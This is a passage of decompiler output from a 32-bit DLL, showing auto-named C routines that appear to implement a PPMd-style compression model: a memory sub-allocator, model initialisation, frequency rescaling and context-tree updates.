    sub_1003194B(v4, v3, (int)a3);
  }
  return a3;
}
// 10095640: using guessed type int dword_10095640[];
// 10095644: using guessed type int dword_10095644[];

//----- (10031DE4) --------------------------------------------------------
int *__usercall sub_10031DE4@<eax>(int a1@<eax>, _DWORD *a2@<ecx>)
{
  int v2; // eax
  int v3; // edx
  int *result; // eax

  v2 = (unsigned __int8)byte_10094F97[a1];
  v3 = (unsigned __int8)byte_10094F68[v2];
  result = &dword_10095640[2 * v2];
  a2[1] = result[1];
  result[1] = (int)a2;
  *a2 = -1;
  a2[2] = v3;
  ++*result;
  return result;
}
// 10095640: using guessed type int dword_10095640[];

//----- (10031E0D) --------------------------------------------------------
_DWORD *__usercall sub_10031E0D@<eax>(_DWORD *result@<eax>)
{
  if ( result == (_DWORD *)dword_10094F60 )
  {
    *result = -1;
    dword_10094F60 += 12;
  }
  else
  {
    result[1] = dword_10095644;
    dword_10095644 = (int)result;
    *result = -1;
    result[2] = 1;
    ++dword_10095640[0];
  }
  return result;
}
// 10094F60: using guessed type int dword_10094F60;
// 10095640: using guessed type int dword_10095640[];
// 10095644: using guessed type int dword_10095644;

//----- (10031E3F) --------------------------------------------------------
_DWORD *__usercall sub_10031E3F@<eax>(_DWORD *a1@<edi>, int a2)
{
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  _DWORD *v5; // edx
  int v6; // ecx
  int v7; // eax
  _DWORD *v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  v2 = (unsigned __int8)byte_10094F97[a2];
  v3 = dword_10094F60;
  v10 = v2;
  if ( (unsigned int)a1 > dword_10094F60 + 0x4000 )
    return a1;
  v4 = 2 * v2;
  if ( (unsigned int)a1 > dword_10095644[2 * v2] )
    return a1;
  v5 = (_DWORD *)dword_10095644[2 * v2];
  v6 = v5[1];
  --dword_10095640[2 * v2];
  dword_10095644[2 * v2] = v6;
  v9 = v5;
  sub_10031CF8((int)a1, v5, a2);
  v7 = (unsigned __int8)byte_10094F68[v10];
  if ( a1 == (_DWORD *)v3 )
  {
    dword_10094F60 = 12 * v7 + v3;
  }
  else
  {
    a1[1] = dword_10095644[v4];
    dword_10095644[v4] = (int)a1;
    *a1 = -1;
    a1[2] = v7;
    ++dword_10095640[v4];
  }
  return v9;
}
// 10094F60: using guessed type int dword_10094F60;
// 10095640: using guessed type int dword_10095640[];
// 10095644: using guessed type int dword_10095644[];

//----- (10031ED0) --------------------------------------------------------
int *sub_10031ED0()
{
  _DWORD *v0; // eax
  _DWORD *v1; // edx
  int v2; // edi
  _DWORD *v3; // ecx
  _DWORD *v4; // ecx
  int *v5; // edx
  int v6; // edi
  int *result; // eax
  _DWORD v9[38]; // [esp+Ch] [ebp-98h] BYREF

  memset(v9, 0, sizeof(v9));
  v0 = (_DWORD *)dword_10094F60;
  v1 = (_DWORD *)dword_10094F60;
  if ( *(_DWORD *)dword_10094F60 == -1 )
  {
    do
    {
      v2 = v0[2];
      v0 += 3 * v2;
      v3 = &v9[(unsigned __int8)byte_10094F97[v2]];
      ++*v3;
      *v1 = 0;
      v1 = v0;
    }
    while ( *v0 == -1 );
    dword_10094F60 = (int)v0;
  }
  v4 = v9;
  v5 = dword_10095640;
  v6 = 38;
  do
  {
    result = v5;
    while ( *v4 )
    {
      do
      {
        if ( *(_DWORD *)result[1] )
          break;
        result[1] = *(_DWORD *)(result[1] + 4);
        --*v5;
      }
      while ( (*v4)-- != 1 );
      result = (int *)result[1];
    }
    v5 += 2;
    ++v4;
    --v6;
  }
  while ( v6 );
  return result;
}
// 10094F60: using guessed type int dword_10094F60;
// 10095640: using guessed type int dword_10095640[];

//----- (10031F8D) --------------------------------------------------------
int __usercall sub_10031F8D@<eax>(int result@<eax>)
{
  unsigned __int8 v1; // cl

  v1 = *(_BYTE *)(result + 2);
  if ( v1 < 7u && (*(_BYTE *)(result + 3))-- == 1 )
  {
    *(_WORD *)result *= 2;
    *(_BYTE *)(result + 2) = v1 + 1;
    *(_BYTE *)(result + 3) = 3 << v1;
  }
  return result;
}

//----- (10031FD8) --------------------------------------------------------
void *sub_10031FD8()
{
  int v0; // esi
  int v1; // eax
  unsigned int v2; // ecx
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // ecx
  unsigned int i; // edx
  _BYTE *v8; // eax
  unsigned int v9; // ecx
  unsigned int j; // eax
  int v11; // esi
  char v12; // al
  int v13; // edx

  v0 = 4;
  v1 = 1;
  v2 = 4;
  do
  {
    byte_10094F68[v1 - 1] = v1;
    ++v1;
    --v0;
  }
  while ( v0 );
  v3 = v1 + 1;
  do
  {
    byte_10094F68[v2++] = v3;
    v3 += 2;
  }
  while ( v2 < 8 );
  v4 = v3 + 1;
  while ( v2 < 0xC )
  {
    byte_10094F68[v2++] = v4;
    v4 += 3;
  }
  v5 = v4 + 1;
  while ( v2 < 0x26 )
  {
    byte_10094F68[v2++] = v5;
    v5 += 4;
  }
  v6 = 0;
  for ( i = 0; i < 0x80; ++i )
  {
    v8 = (char *)&unk_10094F98 + i;
    v6 += (unsigned __int8)byte_10094F68[v6] < i + 1;
    *v8 = v6;
  }
  byte_10094258 = 0;
  byte_10094259 = 2;
  memset(&unk_1009425A, 4, 9u);
  memset(&unk_10094263, 6, 0xF5u);
  v9 = 5;
  for ( j = 0; j < 5; ++j )
    byte_10094150[j] = j;
  v11 = 1;
  v12 = 5;
  v13 = 1;
  do
  {
    --v13;
    byte_10094150[v9] = v12;
    if ( !v13 )
    {
      v13 = ++v11;
      ++v12;
    }
    ++v9;
  }
  while ( v9 < 0x104 );
  dword_1009435C = -2069057649;
  return &unk_10095770;
}
// 10094258: using guessed type char byte_10094258;
// 10094259: using guessed type char byte_10094259;
// 1009435C: using guessed type int dword_1009435C;

//----- (100320C3) --------------------------------------------------------
char *__userpurge sub_100320C3@<eax>(int a1@<eax>, int a2)
{
  char *result; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  unsigned int i; // eax
  _WORD *v8; // ebx
  char *v9; // eax
  _WORD *v10; // esi
  unsigned int j; // ecx
  char *v12; // esi
  int v13; // edi
  unsigned __int8 v14; // dl
  int v15; // esi
  _DWORD *v16; // ecx
  int v17; // edi
  char *v18; // [esp+8h] [ebp-8h]
  int v19; // [esp+8h] [ebp-8h]
  int v20; // [esp+Ch] [ebp-4h]
  unsigned int v21; // [esp+18h] [ebp+8h]
  int v22; // [esp+18h] [ebp+8h]

  memset(byte_100933C8, 0, sizeof(byte_100933C8));
  byte_100933B3 = 1;
  byte_100933B0 = 1;
  if ( a1 >= 2 )
  {
    dword_10094358 = a1;
    dword_10093390 = a1;
    dword_10094F90 = a2;
    sub_10031A3B();
    if ( a1 >= 12 )
      a1 = 12;
    dword_100933C4 = -1 - a1;
    dword_10094254 = -1 - a1;
    v4 = sub_10031CBF();
    dword_100933C0 = v4;
    *(_DWORD *)(v4 + 8) = 0;
    *(_BYTE *)v4 = -1;
    *(_WORD *)(v4 + 2) = 257;
    v5 = sub_10031C67(128);
    v6 = 0;
    *(_DWORD *)(v4 + 4) = v5;
    byte_100933B1 = 0;
    for ( i = 0; i < 0x600; i += 6 )
    {
      *(_BYTE *)(i + *(_DWORD *)(v4 + 4)) = v6;
      *(_BYTE *)(*(_DWORD *)(v4 + 4) + i + 1) = 1;
      *(_DWORD *)(*(_DWORD *)(v4 + 4) + i + 2) = 0;
      ++v6;
    }
    v21 = 0;
    v20 = 0;
    v18 = byte_10094150;
    v8 = &unk_100934C8;
    do
    {
      v9 = v18;
      while ( (unsigned __int8)*v9 == v21 )
      {
        v9 = &byte_10094150[++v20];
        v18 = &byte_10094150[v20];
      }
      v10 = v8;
      for ( j = 0; j < 8; ++j )
        *v10++ = 0x4000 - (unsigned __int16)word_10074DEC[j] / (unsigned int)(v20 + 1);
      v12 = (char *)(v8 + 8);
      v13 = 7;
      do
      {
        memcpy(v12, v8, 0x10u);
        v12 += 16;
        --v13;
      }
      while ( v13 );
      ++v21;
      v8 += 64;
    }
    while ( v21 < 0x19 );
    v14 = byte_10094153;
    v15 = 0;
    v22 = 3;
    result = (char *)&unk_10094360;
    v19 = 24;
    do
    {
      while ( v14 == v22 )
        v14 = byte_10094154[v15++];
      *(_WORD *)result = 16 * v15 + 40;
      result[2] = 3;
      result[3] = 7;
      v16 = result + 4;
      v17 = 31;
      do
      {
        *v16++ = *(_DWORD *)result;
        --v17;
      }
      while ( v17 );
      ++v22;
      result += 128;
      --v19;
    }
    while ( v19 );
  }
  else
  {
    dword_10093390 = dword_10094358;
    result = (char *)dword_100933C0;
    while ( 1 )
    {
      result = (char *)*((_DWORD *)result + 2);
      if ( !result )
        break;
      --dword_10093390;
    }
  }
  return result;
}
// 10074DEC: using guessed type __int16 word_10074DEC[];
// 10093390: using guessed type int dword_10093390;
// 100933B0: using guessed type char byte_100933B0;
// 100933B1: using guessed type char byte_100933B1;
// 100933B3: using guessed type char byte_100933B3;
// 100933C0: using guessed type int dword_100933C0;
// 100933C4: using guessed type int dword_100933C4;
// 10094153: using guessed type char byte_10094153;
// 10094254: using guessed type int dword_10094254;
// 10094358: using guessed type int dword_10094358;
// 10094F90: using guessed type int dword_10094F90;

//----- (10032276) --------------------------------------------------------
_BYTE *__userpurge sub_10032276@<eax>(int a1@<ebx>, unsigned __int8 *a2@<edi>, int a3)
{
  _BYTE *result; // eax
  int v4; // esi
  char v5; // cl
  int v6; // ecx
  int v7; // esi
  int v8; // edx
  int v9; // ecx
  int v10; // edx
  int v11; // [esp+4h] [ebp-4h]

  v11 = *a2;
  result = sub_10031D75(a3, (v11 + 2) >> 1, *((_DWORD **)a2 + 1));
  v4 = *((unsigned __int16 *)a2 + 1);
  v5 = a2[1] & (4 * (a1 + 4));
  *((_DWORD *)a2 + 1) = result;
  a2[1] = 8 * (*result >= 0x40u) + v5;
  v6 = (unsigned __int8)result[1];
  v7 = v4 - v6;
  v8 = (v6 + a1) >> a1;
  result[1] = v8;
  *((_WORD *)a2 + 1) = (unsigned __int8)v8;
  do
  {
    v9 = (unsigned __int8)result[7];
    result += 6;
    v7 -= v9;
    v10 = (v9 + a1) >> a1;
    result[1] = v10;
    *((_WORD *)a2 + 1) += (unsigned __int8)v10;
    a2[1] |= 8 * (*result >= 0x40u);
    --v11;
  }
  while ( v11 );
  *((_WORD *)a2 + 1) += (a1 + v7) >> a1;
  return result;
}

//----- (10032306) --------------------------------------------------------
unsigned __int8 *__thiscall sub_10032306(unsigned __int8 *this, int a2)
{
  char *v3; // eax
  int v4; // ebx
  char *v5; // edi
  int v6; // eax
  __int16 v7; // cx
  _DWORD *v8; // ecx
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]

  if ( !*this )
  {
    if ( *((_DWORD *)this + 1) >= (unsigned int)dword_10094F60 )
    {
      *((_DWORD *)this + 1) = a2 >= dword_10094358 ? 0 : sub_10032306(a2 + 1);
      if ( *((_DWORD *)this + 1) || a2 <= 9 )
        return this;
    }
LABEL_21:
    sub_10031E0D(this);
    return 0;
  }
  v10 = (*this + 2) >> 1;
  v3 = (char *)sub_10031E3F(*((_DWORD **)this + 1), v10);
  v4 = *this;
  v5 = &v3[6 * v4];
  *((_DWORD *)this + 1) = v3;
  if ( v5 >= v3 )
  {
    v11 = 6 * v4;
    do
    {
      if ( *(_DWORD *)(v5 + 2) >= (unsigned int)dword_10094F60 )
      {
        if ( a2 >= dword_10094358 )
          *(_DWORD *)(v5 + 2) = 0;
        else
          *(_DWORD *)(v5 + 2) = sub_10032306(a2 + 1);
      }
      else
      {
        *(_DWORD *)(v5 + 2) = 0;
        v6 = v11 + *((_DWORD *)this + 1);
        v7 = *(_WORD *)v5;
        *(_WORD *)v5 = *(_WORD *)v6;
        *(_DWORD *)(v5 + 2) = *(_DWORD *)(v6 + 2);
        *(_DWORD *)(v6 + 2) = 0;
        --v4;
        v11 -= 6;
        *(_WORD *)v6 = v7;
      }
      v5 -= 6;
    }
    while ( (unsigned int)v5 >= *((_DWORD *)this + 1) );
  }
  if ( v4 == *this || !a2 )
    return this;
  v8 = (_DWORD *)*((_DWORD *)this + 1);
  *this = v4;
  if ( v4 < 0 )
  {
    sub_10031DE4(v10, v8);
    goto LABEL_21;
  }
  if ( v4 )
  {
    sub_10032276(*((unsigned __int16 *)this + 1) > 16 * v4, this, v10);
  }
  else
  {
    this[1] = (this[1] & 0x10) + 8 * (*(_BYTE *)v8 >= 0x40u);
    *((_WORD *)this + 1) = *(_WORD *)v8;
    *((_DWORD *)this + 1) = *(_DWORD *)((char *)v8 + 2);
    sub_10031DE4(v10, v8);
    this[3] = (this[3] + 11) >> 3;
  }
  return this;
}
// 10094358: using guessed type int dword_10094358;
// 10094F60: using guessed type int dword_10094F60;

//----- (1003246A) --------------------------------------------------------
_DWORD *__thiscall sub_1003246A(_DWORD *this, int a2)
{
  _BYTE *v3; // eax
  unsigned int v5; // eax
  unsigned int v6; // esi

  if ( *(_BYTE *)this )
  {
    v5 = this[1];
    v6 = v5 + 6 * *(unsigned __int8 *)this;
    if ( v6 >= v5 )
    {
      do
      {
        if ( *(_DWORD *)(v6 + 2) < (unsigned int)dword_10094F60 || a2 >= dword_10094358 )
          *(_DWORD *)(v6 + 2) = 0;
        else
          *(_DWORD *)(v6 + 2) = sub_1003246A(a2 + 1);
        v6 -= 6;
      }
      while ( v6 >= this[1] );
    }
  }
  else
  {
    if ( this[1] < (unsigned int)dword_10094F60 || a2 >= dword_10094358 )
      this[1] = 0;
    else
      this[1] = sub_1003246A(a2 + 1);
    if ( !this[1] )
    {
      v3 = (_BYTE *)this[2];
      if ( !*v3 || v3[1] == 0xFF )
      {
        sub_10031DE4(1, this);
        return 0;
      }
    }
  }
  return this;
}
// 10094358: using guessed type int dword_10094358;
// 10094F60: using guessed type int dword_10094F60;

//----- (10032513) --------------------------------------------------------
char *__cdecl sub_10032513(unsigned __int8 *a1, unsigned __int8 *a2, int a3)
{
  unsigned __int8 *v3; // esi
  unsigned __int8 *v4; // edi
  _DWORD *v6; // eax
  unsigned __int8 v7; // al
  int v8; // edi
  char *result; // eax
  int v10; // eax
  int v11; // eax

  v3 = (unsigned __int8 *)dword_100933C0;
  v4 = (unsigned __int8 *)dword_100933C0;
  for ( dword_100933AC = (int)Block; v4 != a1; v4 = (unsigned __int8 *)*((_DWORD *)v4 + 2) )
  {
    if ( (*v4)-- == 1 )
    {
      v6 = (_DWORD *)*((_DWORD *)v4 + 1);
      v4[1] = (v4[1] & 0x10) + 8 * (*(_BYTE *)v6 >= 0x40u);
      *((_WORD *)v4 + 1) = *(_WORD *)v6;
      *((_DWORD *)v4 + 1) = *(_DWORD *)((char *)v6 + 2);
      sub_10031E0D(v6);
      v4[3] = (v4[3] + 11) >> 3;
    }
    else
    {
      sub_10032276(0, v4, (*v4 + 3) >> 1);
    }
  }
  while ( v4 != a2 )
  {
    v7 = *v4;
    if ( *v4 )
    {
      *((_WORD *)v4 + 1) += 4;
      if ( *((unsigned __int16 *)v4 + 1) > 4 * v7 + 128 )
        sub_10032276(1, v4, (v7 + 2) >> 1);
    }
    else
    {
      v4[3] -= v4[3] >> 1;
    }
    v4 = (unsigned __int8 *)*((_DWORD *)v4 + 2);
  }
  v8 = dword_10094F90;
  if ( dword_10094F90 > 2 )
  {
    dword_100933C0 = a3;
    result = (char *)((dword_10095648 & 1) == 0);
    dword_100933B8 += (int)result;
    return result;
  }
  if ( dword_10094F90 == 2 )
  {
    while ( 1 )
    {
      v10 = *((_DWORD *)v3 + 2);
      if ( !v10 )
        break;
      v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
      dword_100933C0 = v10;
    }
    sub_1003246A(v3, 0);
    dword_10094F90 = 3;
  }
  else
  {
    if ( !dword_10094F90 || sub_100319C4() < (unsigned int)dword_1008E11C >> 1 )
    {
      result = sub_100320C3(dword_10094358, v8);
      byte_100933B0 = 0;
      byte_100933B3 = -1;
      return result;
    }
    while ( 1 )
    {
      v11 = *((_DWORD *)v3 + 2);
      if ( !v11 )
        break;
      v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
      dword_100933C0 = v11;
    }
    while ( 1 )
    {
      sub_10032306(v3, 0);
      sub_10031ED0();
      if ( sub_100319C4() <= 3 * ((unsigned int)dword_1008E11C >> 2) )
        break;
      v3 = (unsigned __int8 *)dword_100933C0;
    }
  }
  result = (char *)dword_10094358;
  dword_100933B8 = 0;
  dword_10093390 = dword_10094358;
  return result;
}
// 1008E11C: using guessed type int dword_1008E11C;
// 10093390: using guessed type int dword_10093390;
// 100933AC: using guessed type int dword_100933AC;
// 100933B0: using guessed type char byte_100933B0;
// 100933B3: using guessed type char byte_100933B3;
// 100933B8: using guessed type int dword_100933B8;
// 100933C0: using guessed type int dword_100933C0;
// 10094358: using guessed type int dword_10094358;
// 10094F90: using guessed type int dword_10094F90;
// 10095648: using guessed type int dword_10095648;

//----- (10032692) --------------------------------------------------------
int __usercall sub_10032692@<eax>(int a1@<eax>, int a2@<ecx>)
{
  unsigned int v2; // ebx
  int i; // esi
  bool v4; // zf
  int v5; // ecx
  char v6; // dl
  int v7; // edi
  int v8; // eax
  unsigned __int8 v9; // dl
  unsigned __int8 v10; // al
  int *v11; // eax
  unsigned __int8 *v13; // eax
  int v14; // [esp+Ch] [ebp-4Ch] BYREF
  char v15; // [esp+10h] [ebp-48h] BYREF
  int v16; // [esp+4Ch] [ebp-Ch]
  int *v17; // [esp+50h] [ebp-8h]
  char v18; // [esp+56h] [ebp-2h]
  unsigned __int8 v19; // [esp+57h] [ebp-1h]

  ++dword_10093390;
  v2 = dword_100933AC;
  i = a2;
  v4 = a2 == 0;
  v5 = dword_1009414C;
  v6 = *(_BYTE *)dword_1009414C;
  v7 = a1;
  v16 = a1;
  v18 = v6;
  v14 = dword_1009414C;
  v17 = (int *)&v15;
  *(_DWORD *)(dword_1009414C + 2) = dword_100933AC;
  if ( v4 )
    goto LABEL_3;
  v7 = *(_DWORD *)(a1 + 8);
  while ( !*(_DWORD *)(i + 2) )
  {
    v11 = v17++;
    ++dword_10093390;
    v6 = v18;
    *v11 = i;
    *(_DWORD *)(i + 2) = v2;
LABEL_3:
    v8 = *(_DWORD *)(v7 + 8);
    if ( !v8 )
    {
      if ( dword_10094F90 > 2 )
      {
        do
LABEL_15:
          *(_DWORD *)(*--v17 + 2) = v7;
        while ( v17 != &v14 );
        dword_100933AC = (int)Block + 1;
        dword_10093390 = 1;
      }
      return v7;
    }
    v7 = *(_DWORD *)(v7 + 8);
    if ( *(_BYTE *)v8 )
    {
      for ( i = *(_DWORD *)(v8 + 4); *(_BYTE *)i != v6; i += 6 )
        ;
      v9 = *(_BYTE *)(i + 1);
      v10 = 2 * (v9 < 0x73u);
      v19 = v10;
      *(_BYTE *)(i + 1) = v10 + v9;
      *(_WORD *)(v7 + 2) += v10;
    }
    else
    {
      i = v8 + 2;
      *(_BYTE *)(v7 + 3) = *(_BYTE *)(v8 + 3) + (*(_BYTE *)(v8 + 3) < 0x20u);
    }
  }
  if ( dword_10094F90 > 2 )
  {
    v7 = *(_DWORD *)(i + 2);
    goto LABEL_15;
  }
  if ( *(_DWORD *)(i + 2) <= v2 )
  {
    v17 = (int *)v5;
    dword_1009414C = i;
    v13 = sub_1003298D((unsigned __int8 *)v7, 0, 0);
    v5 = (int)v17;
    *(_DWORD *)(i + 2) = v13;
    dword_1009414C = v5;
  }
  if ( dword_10093390 == 1 && v16 == dword_100933C0 )
  {
    *(_DWORD *)(v5 + 2) = *(_DWORD *)(i + 2);
    dword_100933AC = v2 - 1;
  }
  return *(_DWORD *)(i + 2);
}
// 10093390: using guessed type int dword_10093390;
// 100933AC: using guessed type int dword_100933AC;
// 100933C0: using guessed type int dword_100933C0;
// 1009414C: using guessed type int dword_1009414C;
// 10094F90: using guessed type int dword_10094F90;

//----- (100327C8) --------------------------------------------------------
char __usercall sub_100327C8@<al>(unsigned __int8 *a1@<edi>)
{
  int i; // eax
  __int16 v2; // dx
  int v3; // esi
  _WORD *v4; // ebx
  unsigned int v5; // esi
  unsigned int v6; // ecx
  int v7; // ecx
  unsigned int v8; // ecx
  int v9; // ecx
  _BYTE *v10; // eax
  unsigned int v11; // esi
  int v12; // ecx
  bool v13; // zf
  unsigned __int8 v14; // al
  int v15; // eax
  int v16; // eax
  _DWORD *v17; // eax
  unsigned __int8 v18; // cl
  int v19; // edx
  _BYTE *v20; // esi
  __int16 v22; // [esp+8h] [ebp-14h]
  __int16 v23; // [esp+8h] [ebp-14h]
  int v24; // [esp+Ah] [ebp-12h]
  int v25; // [esp+Ah] [ebp-12h]
  int v26; // [esp+10h] [ebp-Ch]
  unsigned int v27; // [esp+10h] [ebp-Ch]
  BOOL v28; // [esp+14h] [ebp-8h]
  int v29; // [esp+18h] [ebp-4h]

  v29 = *a1;
  for ( i = dword_1009414C; i != *((_DWORD *)a1 + 1); i -= 6 )
  {
    v2 = *(_WORD *)i;
    v3 = *(_DWORD *)(i + 2);
    *(_WORD *)i = *(_WORD *)(i - 6);
    *(_DWORD *)(i + 2) = *(_DWORD *)(i - 4);
    *(_DWORD *)(i - 4) = v3;
    *(_WORD *)(i - 6) = v2;
  }
  *(_BYTE *)(i + 1) += 4;
  v4 = a1 + 2;
  *((_WORD *)a1 + 1) += 4;
  v5 = *((unsigned __int16 *)a1 + 1) - *(unsigned __int8 *)(i + 1);
  v28 = dword_10093390 || dword_10094F90 > 2;
  v6 = (v28 + (unsigned int)*(unsigned __int8 *)(i + 1)) >> 1;
  *(_BYTE *)(i + 1) = v6;
  *v4 = (unsigned __int8)v6;
  do
  {
    v7 = *(unsigned __int8 *)(i + 7);
    i += 6;
    v5 -= v7;
    v8 = (unsigned int)(v28 + v7) >> 1;
    *(_BYTE *)(i + 1) = v8;
    *v4 += (unsigned __int8)v8;
    if ( *(_BYTE *)(i + 1) > *(_BYTE *)(i - 5) )
    {
      v22 = *(_WORD *)i;
      v9 = i;
      v24 = *(_DWORD *)(i + 2);
      do
      {
        v26 = v9 - 6;
        *(_WORD *)v9 = *(_WORD *)(v9 - 6);
        *(_DWORD *)(v9 + 2) = *(_DWORD *)(v9 - 4);
        v9 = v26;
      }
      while ( HIBYTE(v22) > *(_BYTE *)(v26 - 5) );
      *(_WORD *)v26 = v22;
      *(_DWORD *)(v26 + 2) = v24;
    }
    --v29;
  }
  while ( v29 );
  v10 = (_BYTE *)(i + 1);
  if ( *v10 )
    goto LABEL_23;
  do
  {
    ++v29;
    v10 -= 6;
  }
  while ( !*v10 );
  v11 = v29 + v5;
  v12 = (*a1 + 2) >> 1;
  v14 = *a1 - v29;
  v13 = *a1 == (unsigned __int8)v29;
  v27 = v11;
  *a1 = v14;
  if ( !v13 )
  {
    v17 = sub_10031D75(v12, (v14 + 2) >> 1, *((_DWORD **)a1 + 1));
    a1[1] &= ~8u;
    v18 = a1[1];
    v19 = *a1;
    v20 = v17;
    *((_DWORD *)a1 + 1) = v17;
    a1[1] = v18 | (8 * (*(_BYTE *)v17 >= 0x40u));
    do
    {
      v20 += 6;
      a1[1] |= 8 * (*v20 >= 0x40u);
      --v19;
    }
    while ( v19 );
    v5 = v27;
LABEL_23:
    v16 = *((_DWORD *)a1 + 1);
    *v4 += v5 - (v5 >> 1);
    a1[1] |= 4u;
    dword_1009414C = v16;
    return v16;
  }
  v15 = *((_DWORD *)a1 + 1);
  LOBYTE(v23) = *(_WORD *)v15;
  v25 = *(_DWORD *)(v15 + 2);
  HIBYTE(v23) = (v11 + 2 * (unsigned __int8)HIBYTE(*(_WORD *)v15) - 1) / v11;
  if ( HIBYTE(v23) > 0x29u )
    HIBYTE(v23) = 41;
  sub_10031DE4(v12, *((_DWORD **)a1 + 1));
  *v4 = v23;
  *((_DWORD *)a1 + 1) = v25;
  LOBYTE(v16) = (a1[1] & 0x10) + 8 * ((unsigned __int8)v23 >= 0x40u);
  a1[1] = v16;
  dword_1009414C = (int)(a1 + 2);
  return v16;
}
// 10093390: using guessed type int dword_10093390;
// 1009414C: using guessed type int dword_1009414C;
// 10094F90: using guessed type int dword_10094F90;

//----- (1003298D) --------------------------------------------------------
unsigned __int8 *__userpurge sub_1003298D@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 *i@<ecx>, int a3)
{
  unsigned __int8 *v3; // esi
  unsigned __int8 *v4; // edi
  int *v5; // ebx
  bool v6; // zf
  unsigned __int8 v7; // al
  unsigned __int8 *result; // eax
  unsigned __int8 v9; // cl
  _BYTE *v10; // eax
  char v11; // dl
  unsigned int v12; // eax
  unsigned int v13; // ecx
  unsigned __int8 v14; // al
  int v15; // ecx
  int v16; // [esp+Ch] [ebp-50h] BYREF
  char v17; // [esp+10h] [ebp-4Ch] BYREF
  int v18; // [esp+4Ch] [ebp-10h]
  _BYTE *v19; // [esp+50h] [ebp-Ch]
  unsigned __int8 v20; // [esp+5Bh] [ebp-1h]

  v3 = a1;
  v4 = *(unsigned __int8 **)(dword_1009414C + 2);
  v5 = &v16;
  v20 = *(_BYTE *)dword_1009414C;
  if ( !a3 )
  {
    v6 = *((_DWORD *)a1 + 2) == 0;
    v16 = dword_1009414C;
    v5 = (int *)&v17;
    if ( v6 )
      goto LABEL_16;
  }
  if ( !i )
    goto LABEL_5;
  v3 = (unsigned __int8 *)*((_DWORD *)a1 + 2);
  while ( *(unsigned __int8 **)(i + 2) == v4 )
  {
    *v5++ = (int)i;
    if ( !*((_DWORD *)v3 + 2) )
      goto LABEL_14;
LABEL_5:
    v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
    if ( *v3 )
    {
      for ( i = (unsigned __int8 *)*((_DWORD *)v3 + 1); *i != v20; i += 6 )
        ;
      v7 = i[1];
      i[1] = (v7 < 0x73u) + v7;
      *((_WORD *)v3 + 1) += v7 < 0x73u;
    }
    else
    {
      i = v3 + 2;
      v3[3] += v3[3] < 0x18u && **((_BYTE **)v3 + 2) == 0;
    }
  }
  v3 = *(unsigned __int8 **)(i + 2);
LABEL_14:
  if ( v5 == &v16 )
    return v3;
LABEL_16:
  v9 = *v4;
  v6 = *v3 == 0;
  LOBYTE(v18) = 0;
  BYTE2(v18) = v9;
  v19 = v4 + 1;
  BYTE1(v18) = (8 * (v9 >= 0x40u)) | (16 * (v20 >= 0x40u));
  if ( v6 )
  {
    v14 = v3[3];
  }
  else
  {
    v10 = (_BYTE *)*((_DWORD *)v3 + 1);
    if ( *v10 != v9 )
    {
      do
      {
        v11 = v10[6];
        v10 += 6;
      }
      while ( v11 != v9 );
    }
    v12 = (unsigned __int8)v10[1] - 1;
    v13 = *((unsigned __int16 *)v3 + 1) - *v3 - v12;
    if ( 2 * v12 > v13 )
      v12 = (v12 + 2 * v13 - 3) / v13;
    else
      LOBYTE(v12) = v13 < 5 * v12;
    v14 = v12 + 1;
  }
  HIBYTE(v18) = v14;
  while ( 1 )
  {
    result = (unsigned __int8 *)sub_10031CBF();
    if ( !result )
      break;
    *(_DWORD *)result = v18;
    *((_DWORD *)result + 1) = v19;
    v15 = *--v5;
    *((_DWORD *)result + 2) = v3;
    *(_DWORD *)(v15 + 2) = result;
    v3 = result;
    if ( v5 == &v16 )
      return result;
  }
  return 0;
}
// 1009414C: using guessed type int dword_1009414C;

//----- (10032AD9) --------------------------------------------------------
char *__cdecl sub_10032AD9(unsigned __int8 *a1)
{
  unsigned __int8 *v1; // ebx
  int v2; // esi
  char v3; // dl
  int v4; // eax
  int v5; // edi
  int v6; // ecx
  unsigned __int8 v7; // dl
  __int16 v8; // cx
  char *result; // eax
  int v10; // ecx
  unsigned __int8 *v11; // eax
  unsigned int v12; // esi
  int v13; // eax
  _DWORD *v14; // eax
  int v15; // eax
  unsigned __int8 v16; // cl
  unsigned __int16 v17; // dx
  unsigned int v18; // ecx
  unsigned int v19; // eax
  __int16 v20; // dx
  int v21; // eax
  int v22; // [esp+Ch] [ebp-1Ch]
  __int16 v23; // [esp+10h] [ebp-18h]
  unsigned int v24; // [esp+10h] [ebp-18h]
  unsigned int v25; // [esp+14h] [ebp-14h]
  int v26; // [esp+18h] [ebp-10h]
  unsigned int v27; // [esp+18h] [ebp-10h]
  unsigned int v28; // [esp+1Ch] [ebp-Ch]
  unsigned int v29; // [esp+20h] [ebp-8h]
  unsigned __int8 v30; // [esp+27h] [ebp-1h]

  v1 = (unsigned __int8 *)dword_100933C0;
  v2 = dword_1009414C;
  v3 = *(_BYTE *)dword_1009414C;
  v29 = *(_DWORD *)(dword_1009414C + 2);
  v4 = *((_DWORD *)a1 + 2);
  v5 = 0;
  v25 = *(unsigned __int8 *)(dword_1009414C + 1);
  v30 = *(_BYTE *)dword_1009414C;
  if ( v25 < 0x1F && v4 )
  {
    if ( *(_BYTE *)v4 )
    {
      v5 = *(_DWORD *)(v4 + 4);
      if ( *(_BYTE *)v5 != v3 )
      {
        do
          v5 += 6;
        while ( *(_BYTE *)v5 != v3 );
        if ( *(_BYTE *)(v5 + 1) >= *(_BYTE *)(v5 - 5) )
        {
          v23 = *(_WORD *)v5;
          v6 = v5 - 6;
          v26 = *(_DWORD *)(v5 + 2);
          *(_WORD *)v5 = *(_WORD *)(v5 - 6);
          *(_DWORD *)(v5 + 2) = *(_DWORD *)(v5 - 6 + 2);
          *(_WORD *)v6 = v23;
          *(_DWORD *)(v6 + 2) = v26;
          v5 -= 6;
        }
      }
      v7 = *(_BYTE *)(v5 + 1);
      v8 = 2 * (v7 < 0x73u);
      *(_BYTE *)(v5 + 1) = v8 + v7;
      *(_WORD *)(v4 + 2) += v8;
    }
    else
    {
      v5 = v4 + 2;
      *(_BYTE *)(v4 + 3) += *(_BYTE *)(v4 + 3) < 0x20u;
    }
  }
  if ( dword_10093390 || !v29 )
  {
    v10 = dword_100933AC;
    *(_BYTE *)dword_100933AC = v30;
